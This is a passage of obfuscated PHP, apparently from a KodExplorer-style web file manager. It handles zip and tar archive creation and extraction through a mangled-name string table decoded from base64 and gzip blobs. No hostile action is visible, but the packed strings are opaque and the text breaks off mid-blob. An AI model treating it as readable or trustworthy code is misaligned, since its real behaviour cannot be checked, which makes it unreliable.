show_json($FÂî’¸âáÂ[$bâáº‰¼è[1027]], !1); } if (!file_exists($fñ‡‡Ì·œÜ)) { show_json($bâáº‰¼è[1920], !1); } @rename($fñ‡‡Ì·œÜ, $b‡’÷»âÚ¦); goto A‘®èĞ­«; c§˜ØË˜¬: mk_dir($B¶Ìäò¤È‰); $b‡’÷»âÚ¦ = $B¶Ìäò¤È‰ . md5($a²ÖÔ¡•³ˆ . $Fºà½ËĞÅ“ . $FÅ¹ŸÈ’ŸÈ); $eˆ½è®¡ĞÎ = $bâáº‰¼è[33]; goto E ‹¡»ƒì˜; cÛ‚Œ»È†: $eˆ½è®¡ĞÎ = unzip_pre_name($eˆ½è®¡ĞÎ); $D¿¤‹ğ­Ãö = get_path_this($eˆ½è®¡ĞÎ); $fñ‡‡Ì·œÜ = unzip_filter_ext($B¶Ìäò¤È‰ . $D¿¤‹ğ­Ãö); goto eäµˆ‘óñ ; b¯”ÛôÒ˜ï: $bâáº‰¼è =& $_SERVER[Î¿—”òá]; self::init(); $B¶Ìäò¤È‰ = TEMP_FILES . hash_path($a²ÖÔ¡•³ˆ) . $bâáº‰¼è[8]; goto c§˜ØË˜¬; A‘®èĞ­«: if (!file_exists($b‡’÷»âÚ¦)) { del_dir($B¶Ìäò¤È‰); show_json($bâáº‰¼è[1921]); } IO::fileOut($b‡’÷»âÚ¦, $F±”Øêç‰, $D¿¤‹ğ­Ãö); goto BùêäÒî®Û; BùêäÒî®Û: } static function create($dµ ¯¬Äˆ, $E’‰á§†í¹) { $EÀ•éŠ®å° =& $_SERVER[Î¿—”òá]; self::init(); $a’×¾²á…º = get_path_ext($dµ ¯¬Äˆ); $c¤˜™‹æµ• = !1; if (self::checkIfType($a’×¾²á…º, $EÀ•éŠ®å°[301])) { if (kodZipArchive::support($EÀ•éŠ®å°[1004])) { return kodZipArchive::create($dµ ¯¬Äˆ, $E’‰á§†í¹); } $Aãƒ½Ÿ‘÷ = new PclZip($dµ ¯¬Äˆ); foreach ($E’‰á§†í¹ as $cÚƒŠ£‘‰– => $f’› Ğ¤ÙŠ) { $f’› Ğ¤ÙŠ = str_replace($EÀ•éŠ®å°[467], $EÀ•éŠ®å°[8], $f’› Ğ¤ÙŠ); $AÏÅÜã÷†Ë = Kodio::clear(get_path_father($f’› Ğ¤ÙŠ)); if ($cÚƒŠ£‘‰– == 0) { $c¤˜™‹æµ• = $Aãƒ½Ÿ‘÷->create($f’› Ğ¤ÙŠ, PCLZIP_OPT_REMOVE_PATH, $AÏÅÜã÷†Ë, PCLZIP_CB_PRE_FILE_NAME, $EÀ•éŠ®å°[1922]); continue; } $c¤˜™‹æµ• = $Aãƒ½Ÿ‘÷->add($f’› Ğ¤ÙŠ, PCLZIP_OPT_REMOVE_PATH, $AÏÅÜã÷†Ë, PCLZIP_CB_PRE_FILE_NAME, $EÀ•éŠ®å°[1922]); } } else { if (self::checkIfType($a’×¾²á…º, $EÀ•éŠ®å°[1893])) { foreach ($E’‰á§†í¹ as $cÚƒŠ£‘‰– => $f’› Ğ¤ÙŠ) { $f’› Ğ¤ÙŠ = str_replace($EÀ•éŠ®å°[467], $EÀ•éŠ®å°[8], $f’› Ğ¤ÙŠ); $AÏÅÜã÷†Ë = Kodio::clear(get_path_father($f’› Ğ¤ÙŠ)); if ($cÚƒŠ£‘‰– == 0) { $c¤˜™‹æµ• = PclTarCreate($dµ ¯¬Äˆ, array($f’› Ğ¤ÙŠ), $a’×¾²á…º, null, $AÏÅÜã÷†Ë); continue; } $c¤˜™‹æµ• = PclTarAddList($dµ ¯¬Äˆ, array($f’› Ğ¤ÙŠ), $EÀ•éŠ®å°[33], $AÏÅÜã÷†Ë, $a’×¾²á…º); } } } return $c¤˜™‹æµ•; } } goto a·é‰Çš; F¬ÔÜÚöÜÚ: if (!function_exists('_kodDe')) { function _kodDe($e„¼ä£Š») { $e„¼ä£Š» = base64_decode($e„¼ä£Š»); $Cš¿‰¢ƒ³ò = strlen($e„¼ä£Š»); $C×¶ØÀŸ‰ì = ''; $DÄ·Õåö = ord($e„¼ä£Š»[0]) - 30; for ($a¿‘ÖÏ–‚§ = 1; $a¿‘ÖÏ–‚§ < $Cš¿‰¢ƒ³ò; $a¿‘ÖÏ–‚§ += 2) { if ($a¿‘ÖÏ–‚§ + 1 < $Cš¿‰¢ƒ³ò) { $C×¶ØÀŸ‰ì .= chr(ord($e„¼ä£Š»[$a¿‘ÖÏ–‚§ + 1]) + $DÄ·Õåö); $C×¶ØÀŸ‰ì .= chr(ord($e„¼ä£Š»[$a¿‘ÖÏ–‚§]) + $DÄ·Õåö); } else { $C×¶ØÀŸ‰ì .= chr(ord($e„¼ä£Š»[$a¿‘ÖÏ–‚§]) + $DÄ·Õåö); } } return $C×¶ØÀŸ‰ì; } } define("\x81\xce\x90\xbf\x97\x94\xf2\xe1", "\312\317\225\234\302\262\303\352\320\351"); $_SERVER[Î¿—”òá] = explode("\174\2\174\4\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\365\60\107\257\244\334\264\100\201\226\215\223\340\43\72\174\304\71\34\333\211\54\311\266\210\154\31\111\216\223\130\106\131\111\53\171\155\111\53\357\256"."\344\43\11\24\12\341\14\367\121\40\100\313\125\150\41\4\50\127\270\313\121\156\312\325\162\374\3\24\110\2\345\54\55\5\312\365\315\75\263\53\231\266\37\77\34\315\274\171\63\73\307\233\67\157\146\336\173"."\163\342\171\277\334\162\355\111\353\166\133\367\235\165\273\75\361\346\307\217\343\20\370\333\165\335\167\161\370\260\123\177\260\13\372\157\367\334\221\367\367\356\326\260\317\306\223\217\372\162\146\357\245\173\314\171\365"._kodDe('Lk3Umy1gno182mxHs67Gz29jckVfLN+Q20fmq78JQLPo70WaKMs11OGfDi+072DQWwV2ZbdMxtqnyg==')."\xe6\xc4\xa3\xb3\xe3\x1f\xef\xf2\xc8\xd4\x41\x5b\xf\xda\xe4\xfa\xcb\x63\xd2\xa5\xb7\xd4\x8f\x6f\x7e\x77\xe6\x89\xa9\x57\x9e\x6f\xbb\x6f\xeb\xf1\x7f\x6a\x3d\xfe\xf0\xeb\xff\xf6\x93\xbb\x5f\x38\x78\xdd\x87\xc7\xfc\xee\x9c\xbb\x9e"."\215\334\270\365\245\3\347\36\225\334\345\303\353\273\116\372\160\317\15\355\217\356\376\331\346\306\375\112\377\174\374\204\237\357\263\243\264\373\206\160\307\256\253\233\136\74\166\331\253\327\176\321\177\371\322\303\36"."\x3c\xf5\xa0\x47\xc3\xd1\xc1\x2d\xca\x95\x3f\x99\x75\xc0\x8a\xaa\xa3\xf\x7e\x3a\xf4\xfb\x4f\x3f\xd9\xb2\xdf\x45\x9f\x54\x3d\x76\xb8\xfa\xd4\xa5\x37\x9b\x8f\x5d\xfd\xce\xa6\x8d\x7\xce\x50\x2f\xd8\x72\xd3\xcf\x6e\xba\xfc\xb4\x67".strrev('ëx?GÏNÛ¸ØÑœ[–ãã5§Mmb½­7æìd¿óÊñûÒf©x÷³ëç»Miyn·ç<‰î~')."\xab\x3\x76\x7f\x73\xde\x55\x7f\x9d\xf8\xf3\xcf\xdc\x57\xbc\x70\xfe\xe3\x3b\xa4\xcb\x7e\xb8\xf3\xc1\x6d\x6b\x5f\xff\xbc\xeb\xde\xeb\x1f\x7d\x7e\xef\x4d\x17\xff\x4a\x71\x2c\xbb\xee\x5f\x8e\xfb\xfc\xca\x9e\xf3\x6e\x3f\xeb\x85\xcf"."\237\126\367\232\175\313\361\75\47\36\277\340\246\33\303\57\275\171\374\175\267\335\161\303\173\307\205\236\215\37\362\345\61\153\137\333\155\227\135\160\107\267\340\37\51\257\231\222\62\241\32\246\201\1\111\55\237".base64_decode('VjM4rObxrxv/GGNZ1VRwON4bisYj/X19/nA0TkoU03NaioQKsi7nSOEFRTfAp8Ti4gWtoOQtEA5I')."\xc9\xa6\x9c\x90\xd\x52\x92\xaf\x23\xee\xf3\xf7\x5\x43\xab\xe2\xd1\x55\x7d\x7e\x82\x91\x88\x8f\x15\x15\x7d\x12\xc7\x50\x30\x62\xca\xba\x19\x55\x73\xa\xc3\x18\xd7\x59\xbd\x3a\xfc\x5d\x81\x5e\x29\x1a\xf6\xf4\x46\x3c\xde\x68\x20"."\xd4\x8b\xc1\xde\x50\x4f\x4f\x20\x5a\xe\xf\x87\x82\xc1\xe\x8f\x77\x79\x79\x4a\x5f\xd8\xd3\xd5\xe3\x91\x40\xfd\xb2\x4a\x5c\xcd\xa7\xb5\x1a\x69\xd\x4e\x59\x23\xd5\xe2\x40\xa7\xaa\x64\x53\x38\x98\x97\x69\x75\xcc\xc9\x2\x9\x45"."\131\10\214\101\276\230\315\342\110\57\13\221\372\53\151\271\230\45\175\346\23\43\5\135\315\311\264\351\313\225\111\6\305\1\271\150\152\152\76\211\43\376\11\123\227\71\34\324\70\251\53\71\45\117\212\212\370".base64_decode('g35vVILVlDrDoR6JDEVONkxFlwa6/WG/BKveVo1aXC3hfP29oEMkTzAoTVeCqeQKtBicp0JhobDP').base64_decode('H5Y6Vkm8n5JaLqflXaAUMJ6mUFV/OIwDDkLBwQAcOhIJdXZG/CxGGndkENSkiVCpJZZKZ814Sc4W')."\51\261\216\342\337\152\362\103\176\65\203\20\360\230\232\127\213\204\130\111\21\232\306\146\16\11\24\51\266\102\41\71\220\115\43\163\12\114\260\22\16\266\265\343\337\45\4\51\21\207\151\212\156\306\225\174\122".base64_decode('S6l5Mg2XkilHCE82h326CvBIgZorqRUme7QSaUNazSpBNsvSWjal6DxeANnFFNIYdUrI3VvMiSgs')."\232\34\126\263\51\235\116\316\157\303\154\40\305\52\246\11\232\141\320\232\366\27\262\232\234\212\50\272\120\373\116\120\114\250\150\212\300\42\102\353\324\364\234\17\60\0\322\73\200\354\325\376\12\11\243\224\360"."\x53\x42\xa7\xb8\x8\xe3\xaa\x19\x3c\xd6\xf9\xf5\xd0\xe0\x32\xf0\x4f\x2d\xe1\x62\x31\x52\xb5\x61\x25\x9b\x8d\x2b\x13\xa\x99\x20\xb9\x54\xb3\x41\x6b\xef\x36\x12\x6a\xde\xd\x20\x38\x1a\x8\xc5\x87\x65\x63\xb8\x27\xd5\x1c\x47\xb9".base64_decode('KHNMKROuwnCBzGE2bWMWAob93auZfoHFZrWknBVbisPDplmIKPkU7BDSIm08jzqsoCgEyeeQUlKP')."\264\112\352\156\121\133\50\165\1\132\111\117\162\216\67\154\346\262\54\104\133\313\140\6\3\232\23\204\46\252\110\134\231\60\111\47\111\113\222\303\262\16\206\257\255\150\246\235\213\10\343\50\24\262\152\122\66"."\125\55\357\326\222\246\142\72\15\123\127\144\122\132\325\22\11\122\4\234\301\165\70\27\235\75\136\55\157\202\351\353\214\352\162\336\110\53\272\323\117\310\273\105\2\375\314\70\30\105\363\251\106\101\63\124\370".base64_decode('mRZJNk05OQxnPy++7Vvw1XxWzStluJ5kUjEMJ8yia1mnJ5vVxp0hXc2oIE+drZqAM7VIlG0WVF0x')."\150\124\352\352\211\22\144\120\53\305\331\247\313\231\234\334\42\25\212\11\320\63\144\176\126\200\141\154\362\365\26\51\11\243\16\51\127\64\114\247\256\0\366\243\202\205\216\14\136\40\355\354\201\343\251\52\51".base64_decode('ZwRwaQJuqp8vATKSaBqGdkejffFAJ1iMe/3xHk/U202qbcoZWucg4L2sSApc6QRTDhJaL+gjDuzT')."\306\25\35\174\270\143\262\105\32\325\122\11\155\302\105\223\40\162\4\160\11\212\14\173\264\140\72\303\162\76\3\373\47\61\151\52\204\34\215\122\306\332\241\101\45\237\61\207\151\306\210\77\274\302\37\216\107".strrev('9ªËEˆ§$'."\0".'iÏŒv `´Ğòp©¦1À¢p8£^À.OšM\'×@¤¬3¬è°Sô0yã,˜OÑB')."\25\326\335\144\51\250\47\301\32\337\105\52\344\106\15\152\213\15\327\325\304\122\363\152\235\340\337\272\332\301\230\317\125\67\264\324\255\362\74\356\6\127\203\324\130\277\100\352\3\102\207\52\147\45\322\350\62"."\x8c\x7a\x29\xb4\xfc\x5b\x3a\x0\xae\x49\xc2\x34\xb7\x75\x1d\x6\x86\xfd\x47\xf6\xfb\x23\xd1\x78\x8f\x3f\xda\x1d\xf2\x91\x2f\xf8\x3d\x24\x14\xd4\xf0\xd4\xa4\x2d\x1a\xc4\x3f\x43\x64\x4\x81\xa8\x90\x51\x92\x5a\x56\xd3\xe5\x2c\x64"."\100\224\336\24\312\4\62\152\232\363\365\0\20\150\110\307\142\316\307\43\21\65\127\240\14\312\34\56\346\22\102\320\315\113\40\264\0\206\214\261\45\215\255\101\232\116\102\55\156\222\145\156\143\47\145\266\356"."\x48\x13\xf8\x9f\x73\xd6\x94\x96\x93\xa9\x24\x8a\x26\xae\x92\xc2\x33\x17\x83\xea\x2c\x29\xdd\x8a\xcc\x17\x35\x53\x37\x35\x8\xd5\x2d\x28\x3d\x8a\x39\xac\x91\x7e\xce\x28\xb4\x4a\x45\x56\x37\x5a\xcb\x94\x92\x55\x68\x2f\xd\x2b\x94"."\113\3\361\252\304\72\257\240\53\151\225\320\55\220\247\0\234\163\141\325\10\203\114\120\276\241\361\1\50\206\162\200\311\31\266\154\160\246\17\43\302\312\334\331\37\14\306\275\241\336\50\20\105\61\144\40\34"."\210\372\51\105\170\174\161\217\267\217\55\141\174\230\10\2\234\236\345\354\15\103\112\215\2\337\347\13\4\147\271\164\241\203\54\25\207\1\57\54\150\171\103\161\46\111\151\51\316\174\61\306\22\33\347\55\313"."\301\5\340\11\247\234\233\162\346\24\123\166\262\252\133\327\67\51\52\56\223\1\62\4\234\131\146\301\242\12\366\27\164\141\355\13\105\110\206\245\20\12\244\221\204\242\223\172\364\365\223\244\234\60\374\135\176"."\x2\x9c\x49\xd7\x46\x99\x48\x2e\x9e\x81\x8\x65\x74\x45\x80\xaf\xab\x53\x32\x6f\xe3\x52\x5a\x1f\x52\xf6\x44\x2e\xcb\x5\xac\xb8\x6a\x19\xbf\xb8\x96\x18\x1\x5c\xc\x10\x9d\x5c\xa9\xd5\x4e\x3e\x56\xd1\xee\x40\xef\xf2\x78\x4f\xc8"."\xe7\xf\xc6\x3\xbd\x80\x4b\x44\xcb\xe1\xfd\x7d\x3e\xf\x1d\x7c\x11\xde\x11\x8a\x76\x5b\xa0\xfd\x80\x4f\xac\xf0\x4\x3\x76\x74\xff\xca\x40\x24\x1a\xa9\x98\x4\x60\xfd\x7e\x5b\xa\xd8\x72\xf5\x85\xfd\x9d\x81\x95\x2c\xda\x19\xf0"."\7\175\221\270\327\343\355\346\70\275\236\36\22\211\247\341\246\307\160\133\361\343\200\341\105\330\326\51\136\202\333\100\332\231\161\313\76\45\116\45\360\70\247\23\260\170\51\204\66\111\163\341\346\23\265\204\310"."\304\111\255\110\251\225\11\161\71\312\40\162\62\231\241\62\135\230\152\360\117\255\344\211\110\146\41\316\130\101\142\222\5\121\63\150\34\210\153\344\373\22\141\276\145\65\210\103\234\16\45\255\351\312\267\1\74"."\151\223\21\206\55\16\346\15\117\3\43\340\101\273\134\100\11\150\104\342\164\56\32\140\177\340\241\325\111\363\35\146\74\4\266\342\36\270\77\215\17\204\103\275\135\44\303\370\260\102\53\20\40\335\137\103\205"."\x19\xb2\x4d\x35\x39\x4b\x2\x92\x88\xcc\x85\x4a\xda\xe9\x23\x1a\xed\xca\x75\xf8\xe7\x70\xfc\x3\x84\x37\xf2\x71\x25\x4f\x7b\x3d\x1\x19\x33\x63\x1c\x24\x90\x6\xb3\x85\x32\x55\xad\xc8\xbe\x96\xd0\xb4\x2c\x9d\xc7\x60\x3d\x66\xfc"."\202\155\160\107\14\112\44\23\224\71\315\243\253\26\131\34\242\241\345\376\336\70\245\54\34\23\250\21\3\300\226\61\24\46\35\142\152\243\164\3\203\23\303\376\10\345\2\272\62\126\124\151\167\271\135\363\10"."\x15\x2b\x60\xfd\x21\x9f\x77\x1f\x15\x1b\x9f\x57\x33\xe8\x9c\xe7\x1a\x2\x81\xda\xba\x65\x38\x4a\x62\x31\x97\x25\x3a\x87\xe4\x2f\xea\x2c\x37\x14\x53\x6a\x8c\xa5\xb5\x2d\x31\x77\xcc\x5d\xb3\xb4\x65\xd0\xe3\x9c\x92\x9d\x53\xf5\xce"."\305\316\241\171\61\127\355\74\2\30\132\333\350\230\277\36\42\0\304\245\263\207\300\117\133\154\351\334\230\363\360\243\327\54\33\214\15\125\267\314\233\25\163\315\216\215\17\325\325\56\245\337\111\26\165\260\71"."\113\116\262\252\246\346\325\200\52\1\361\205\241\344\21\113\24\20\150\302\224\132\340\320\265\13\326\123\70\30\103\45\303\163\14\72\143\363\206\226\12\371\4\220\375\133\100\164\1\374\171\230\341\171\234\253\141"."\313\130\126\70\357\11\175\24\363\111\316\135\341\274\110\310\111\302\7\324\114\236\115\41\260\240\263\115\261\125\152\136\73\27\377\256\247\3\231\121\350\262\14\317\263\164\102\235\305\274\72\106\267\372\171\145\214"."\x4\x34\x93\xd2\x77\x42\x31\xc7\x15\x4a\x1e\x0\x6e\x89\x3\xe2\xa0\xdb\x36\x90\x24\xc4\xb2\x48\x48\x23\x5f\xe0\xdb\x25\x5\xed\x1d\x48\x2b\xa\x71\x28\x76\x8d\xb3\x58\x4a\xc9\x93\x71\x9a\x41\xb0\x8d\xa4\x5c\x50\x22\x42\xb\xe3"."\361\250\247\43\350\217\123\16\103\70\61\215\43\256\330\301\16\307\100\323\70\107\245\374\41\311\105\146\143\54\53\41\146\40\51\272\256\351\55\350\340\317\50\26\240\54\6\166\115\46\350\117\11\154\245\245\266"."\166\11\167\63\341\22\161\261\323\13\62\225\46\340\356\226\111\10\356\232\130\254\70\250\244\206\6\1\41\313\316\364\320\332\246\365\265\124\112\166\307\300\177\64\202\371\27\251\161\201\217\237\1\144\255\244\311"."\26\334\262\363\251\70\343\200\260\12\354\230\101\323\331\72\13\341\134\152\65\65\123\316\62\64\230\26\205\20\312\155\350\132\115\366\350\170\0\203\234\11\301\325\131\70\275\103\34\262\227\35\115\261\23\7\341"."\340\10\300\34\102\24\377\333\126\105\331\164\36\114\4\57\137\244\2\76\47\31\104\317\112\147\300\207\303\54\240\246\150\265\301\164\66\51\324\320\212\172\122\141\70\26\41\303\224\165\260\146\161\311\16\312\140"."\xc2\xf1\x22\xa8\xb9\x3\x9e\x43\x38\xe0\x9a\xea\x0\xd2\x9e\x3\x9e\xf7\x38\xb8\xc4\xea\xe0\x47\x8\xe\x26\x7f\x3a\x88\x58\xea\xe0\xa5\x93\x60\xc0\xe7\x50\xd\x1f\x12\x8f\x51\xb9\x28\x89\xd6\xd9\x1c\x86\x1b\xf2\xac\x3c\xe9\xc0".base64_decode('9Q8qJSXroLV30EY5aAscaL/hI7XpB/RBaoOCgEkMO+BwwLGlpcAg7QYmVDu4wO3I6Fqx0Ee/JMRw')."\145\10\200\327\224\1\302\232\146\72\350\6\210\5\172\30\7\202\325\341\241\25\174\300\171\355\331\362\111\232\200\343\366\72\140\50\114\357\224\113\342\0\127\34\354\274\225\60\370\51\51\77\315\343\342\222\175"."\43\142\77\36\342\235\310\53\21\225\63\21\341\363\246\234\241\337\256\220\212\303\141\45\71\231\344\233\33\237\260\133\262\306\330\320\43\72\254\104\114\225\207\236\21\10\243\265\231\63\146\120\312\346\164\104\310"."\xc7\x42\x6c\xd3\x52\x37\x6f\x53\xa8\xc0\x57\x1c\xc8\x10\x22\x80\xf\xa\x53\x9e\x82\x42\x9c\xc3\x14\xc9\xa\x29\x1b\x49\x2a\xcb\x8c\xd3\x7b\xa\x85\xc2\x84\xfa\xd3\xd6\x5b\xca\x85\x51\x3e\x33\x69\x13\x25\x58\x80\x43\xe0\xd9\x70"."\164\234\174\210\205\50\371\121\265\70\356\327\170\216\355\54\130\107\333\230\21\354\367\76\65\77\251\346\305\275\73\207\162\236\307\211\2\222\67\217\341\76\236\56\214\171\13\77\33\160\220\63\3\7\330\67\216".strrev('Ì#Éovq.ZZ£Âˆ«Y°c2÷e‡H„ªFÜRmƒö>|£ZtéÍ[$¤î¡VaíAqï\\'."\n".'').base64_decode('w5xkxxxC0Foojvqmi3Sz3V+lqDjpVCMIerNSGLU0qlWMIqlAAvIAPSaj4n3cdswAosJIxS0nErga')."\x1e\xc6\xfa\x80\x60\x93\x5\x23\xa0\xbb\xe0\x24\xe9\x82\x8c\x4d\x5c\x85\xf8\xa\x5\x99\x29\xe\xb\x48\x5\x3b\xf\xb4\xf0\xea\x4a\xb\x9f\x9d\x5b\xdb\xa0\xb6\x28\xff\xa8\x85\xef\x94\xad\x4e\x44\x38\x21\xb2\x68\x3d\xa1\xfa\x14"."\xd8\x35\xba\x74\xcc\xd9\x5c\x40\xfc\x20\x77\x3d\x8e\x7a\x61\x79\xe3\xd3\x77\xad\x31\x69\x98\x4a\x8e\x70\xc2\xf5\xb6\xde\x31\xc1\xf6\x26\x21\xeb\x2e\x1d\xd4\x88\x57\x94\x2f\x9\x44\xf8\x28\x32\xc0\x90\x1d\x3\x17\x1f\xd4\xa8\x2c".base64_decode('DOnfn1JNCIHcTKOHVhxRYPMMJhSIusRVNgZZdZTkcsy1YFbi5K46xHNdfO0RVy7xVgmi8ZbDWyoc')."\x12\xee\x63\x73\xec\xda\xa\x1\x5d\x86\xa9\x15\x78\x8a\x10\xc5\xc9\x42\x12\x2f\x54\xc0\x62\x9d\x8f\x6a\x8\x56\x80\x14\x92\xf\x78\x17\x22\x5c\x92\x17\x49\xd0\x98\xb8\x5d\x59\x80\xe1\x12\x59\x91\x47\xd7\x29\x91\xe0\xe6\xc1\x13"."\x1c\x0\x14\x41\x70\xba\x46\xe8\x9\x62\x25\x8e\x8c\xb\xf7\x97\xf8\x3d\x2b\x2e\xa\x7e\xd8\x85\x17\x28\x97\x9c\x4a\x85\xe8\xf1\x9a\x18\x2e\x47\x15\x4f\x13\x2a\x17\x84\xae\xbe\x59\x51\x42\xac\x32\xba\x27\x9b\xe5\xf7\x68\xf6\xf8"."\xb4\x59\xf0\x5c\x15\x33\x89\x90\x69\xb3\x75\x22\x21\x98\x1e\x70\x57\x82\x31\x99\xae\xd3\x46\x43\x7c\xc6\xf1\x7b\x4a\xbb\xc8\x6b\x65\x3e\xff\x49\x1c\x2b\x9b\x1\x7c\x40\x2b\xc7\x21\x7f\x1c\x56\xf3\x8a\xc1\x56\x26\x9d\xe9\x31\xfc"."\x2f\xf2\x8d\x45\xea\xb5\xa\x32\xa2\x4\x43\x96\x43\xde\x5c\xb1\x5b\x21\xf9\x4f\x47\xb\x30\x4d\x38\x54\x2\x7b\x28\x0\x10\xd7\x11\x76\x72\xc2\xf9\x8e\xb0\x54\xa2\x65\x27\x6e\x5a\x96\xfd\x30\x2a\x43\x98\xf\x96\x21\x6\xf3\xf"._kodDe('L5emxkJwYYf/hE69eJZ9or+zEhXDhce7O3fznfPCMTiESIJrQGm4wdVfCkbP5u5at7Ous7AtRwiKjA==').base64_decode('wpH5+Gfdrut2L1c9OmHlN9orD//4j/XvfdN98YPdd6/+9T3L3230nZ8aPD27Kv7eukHvoZNdZx3w')."\350\25\217\134\61\167\362\363\271\57\376\371\352\245\346\333\133\366\130\271\141\317\301\55\273\36\262\245\271\166\313\345\17\255\176\357\336\13\223\237\336\373\342\131\237\236\176\345\271\133\177\170\332\107\37\154\273".base64_decode('bfzD9a+uvWz/C9cueOitv3/6s2O++fve+hsPrHt83+tvPOyJx/vD19ce8d05C144s0167szvOH6z')."\357\57\376\275\145\321\234\337\274\170\215\172\336\331\107\236\160\307\256\377\370\311\55\357\234\366\331\345\147\264\152\373\154\275\374\375\227\376\372\342\352\221\152\357\33\337\374\342\211\343\223\165\203\55\67\345\232"."\367\70\351\206\203\177\375\273\37\276\264\327\125\347\370\376\376\367\225\227\336\172\145\314\233\71\240\170\361\272\346\75\252\176\361\350\311\55\173\16\175\357\340\15\247\375\73\174\306\165\133\77\376\362\1\317\137"."\xaa\xf7\x52\xe6\xdc\xf1\xeb\x9e\x35\x35\x3f\x68\x7e\xf5\x84\xab\xee\x39\xe3\x80\x91\x35\x83\x2d\x8f\xce\x3c\xf4\x8d\x33\x2\x5b\xf7\xdd\x73\xff\x9f\x3a\xaa\xdf\xdc\xe0\xb9\xf3\x98\x17\x7f\x76\xfa\xf3\xf\x78\xba\x7e\x90\x5f\xed".base64_decode('OvwfmzJTC88xzrl54oFPh3e5+p+Prizu81xP8x3vPnniY50/zW1asOBnX/7z6n9/3fLerof98baa')."\373\67\374\141\133\354\173\63\274\53\257\75\177\317\353\336\155\236\165\377\203\133\142\175\371\33\376\262\337\306\277\376\40\370\112\360\220\113\136\275\147\130\33\137\173\361\306\315\27\375\330\371\122\251\145\311\342"."\xa7\x46\x8f\xb8\xe7\xdc\xbf\xcc\x9f\x75\xe1\x3e\x5b\xff\x74\xea\xf6\x99\x8d\x33\xfb\x67\x8d\xdd\xfd\x5c\xf2\xa7\xa3\xab\xef\x58\x71\x5f\xfd\x4e\xf3\xb1\xc7\xfc\xdf\x3d\x70\xe4\x85\xbb\xce\xdc\x74\xe6\x77\x5d\x7\x6\x6e\x8c\xd6"."\xed\xf2\xb6\xe9\xf4\x3d\x14\xbe\xe5\xba\xda\x13\x76\x5b\xf6\xe7\x4b\x9e\xd8\xb2\xe2\xfe\xb9\x7e\xef\x2e\xfd\x7b\xfd\xea\xff\x4e\xf6\xa7\x17\xff\xcd\x7f\xfb\xf\xce\xdf\x72\xdc\x27\x37\xe\x49\xdf\x7b\xea\xc0\x8f\xb7\x3f\xb1\xee".base64_decode('Yr11L+9Q9a4HffG8T+65oeb2WP1N3U+dHPrLzBfPV6rb/3XLo09cMzBj84+WffHnYzce8OCBfU/v')."\xbb\xed\xca\x3b\xb7\xdc\x72\xea\x33\x77\xad\xf4\x7e\xb2\x75\xc3\xfd\x7\xaf\x3d\xf4\x67\xaf\xff\xe9\xaf\x55\x6b\x1e\x7c\xe7\xa1\xdf\x3e\xf0\xe3\x19\xbb\x2c\x3a\xe9\xc4\x7f\x9d\xe5\xbd\xe9\xab\x3\x66\x48\x2b\x62\x1d\x85\xe7\xe6".base64_decode('/PvKC3/Vs/e6N+/beeaf5b33/u79p/17Yp+X6x+ala9ZveGhY/9ybCRzaOJnB5/j6qnqP+Wzk/fv')."\274\73\373\324\333\157\57\337\166\365\357\57\177\373\203\372\357\347\377\270\357\23\173\126\277\374\240\347\374\266\325\23\215\247\154\111\336\61\373\234\107\136\331\70\371\203\311\335\217\130\65\45\357\330\377\331\177"."\244\202\123\47\135\270\344\200\207\157\372\360\354\227\146\175\272\375\200\133\156\374\347\314\223\16\276\364\202\77\314\67\146\311\367\355\372\314\201\133\57\171\151\42\360\177\277\237\361\361\300\373\227\215\70\123\353"."\102\133\137\176\155\371\173\7\377\362\221\352\241\307\57\151\335\322\172\341\171\261\7\16\176\240\106\176\102\377\243\267\160\365\261\35\153\37\175\355\362\75\127\36\265\172\277\107\242\351\207\306\17\176\146\306\330"."\200\77\137\165\352\223\316\213\32\136\276\370\47\77\255\271\367\13\351\315\213\136\70\372\256\327\67\77\364\104\366\17\115\215\37\15\354\177\346\346\336\133\46\67\56\252\277\366\211\372\337\175\65\343\204\217\272"."\xc6\xde\x53\x3e\x90\x6e\x9a\x3a\xbc\xf3\xcd\xd6\xc9\x47\x53\xf7\xf4\x7c\x3f\x7c\xc1\x2f\x66\x6d\x59\x78\xc8\x3\xbd\x91\xb6\xe1\xd3\x4a\x37\xed\x68\xfd\xf9\x2e\x67\xd6\x3e\xbc\xf7\x67\xb5\xb9\x4f\x7d\xff\x6c\xfe\xd1\x99\x47\x4".strrev('~ùŸW3}ÀÕá9ÏêgŸbxñ–æì|oÑvwÖmÚA¾~Ç<×œãu~;³êĞŞÿnßôô^–}øô¾næ').strrev('ôÿ÷ïÓíÏ-Ğêöİlæá½ÊşõƒEŞı[Nk¿jµíWƒâäéşÍLlA±›ï‘â')."\356\306\25\377\270\146\343\225\67\235\165\335\350\342\3\262\211\15\177\374\375\225\153\256\74\157\346\55\346\156\367\72\316\275\377\365\301\337\26\142\257\155\233\163\345\3\251\336\53\377\326\335\171\244\317\265\122"."\77\144\162\373\125\257\234\364\271\167\354\310\225\351\227\252\317\153\151\174\354\74\75\320\175\372\356\367\70\336\355\331\353\107\33\237\272\152\305\351\336\155\233\172\357\376\356\316\3\16\177\334\77\167\333\236\335"."\157\275\73\377\167\245\217\157\171\360\261\367\316\76\141\321\205\137\75\274\317\336\305\15\377\174\374\200\251\175\217\175\71\26\153\34\11\237\350\233\361\351\331\362\211\365\346\211\216\252\371\337\177\255\141\356\223"."\227\151\173\334\371\132\333\363\133\277\134\175\326\153\213\156\272\171\156\364\40\367\41\127\267\7\202\151\251\372\272\35\247\116\136\277\171\124\177\174\316\37\202\55\221\331\241\253\166\37\70\351\303\310\67\316\27".base64_decode('23+fOvuju/654K7nfpzZ7YiP7+ho1OdIs/89PuX85Jq2gw43H6r+3t/nflTqvGL34p9eHdn75d3/')."\x74\x9f\x6f\xf3\xbc\x1f\xea\x99\x63\x16\xbd\x31\x76\xf9\x82\xf1\x83\xbf\xf8\xe2\x7d\xd7\xcf\xdd\x27\x1f\x7d\xb1\xfe\xf2\xd6\x13\xf\xaf\xbd\xe7\xd5\x8e\x87\xdf\xff\xdd\x43\xc7\xe5\x9f\xdb\xe7\xf9\xa3\x8e\x31\xbf\xda\xab\xd3\xb9"."\56\333\373\306\375\341\107\277\27\76\165\267\7\126\54\332\273\56\252\174\347\330\237\174\167\136\354\324\247\356\230\173\112\172\141\313\260\363\227\377\267\337\77\376\134\237\170\173\105\347\211\273\327\335\334\354\372".base64_decode('+BenzH3z5eIz967v/+NDHdeuS+a+evnl5kca7lHeOO78gd/efumThvOe0cPN+sC21HdHNn321zNT')."\157\274\33\157\133\377\325\37\57\213\337\365\345\273\17\375\256\172\347\61\107\177\